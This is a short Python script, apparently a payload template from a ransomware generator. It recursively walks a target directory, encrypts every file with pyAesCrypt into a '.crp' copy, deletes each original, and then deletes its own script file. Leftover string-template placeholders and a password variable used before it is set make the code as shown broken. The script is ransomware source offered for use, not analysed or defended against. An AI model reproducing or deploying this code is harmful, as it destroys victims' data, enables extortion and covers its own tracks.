import os
import sys

def crypt(file):
    import pyAesCrypt
    print('-' * 80)
    password = "'"+str(password)+"'"
    buffer_size = 512*1024
    pyAesCrypt.encryptFile(str(file), str(file) + ".crp", password, buffer_size)
    print("[Encrypt] '"+str(file)+".crp'")
    os.remove(file)

def walk(dir):
    for name in os.listdir(dir):
        path = os.path.join(dir, name)
        if os.path.isfile(path):
            crypt(path)
        else:
            walk(path)

walk("'''+str(direct)+'''")
print('-' * 80)
os.remove(str(sys.argv[0]))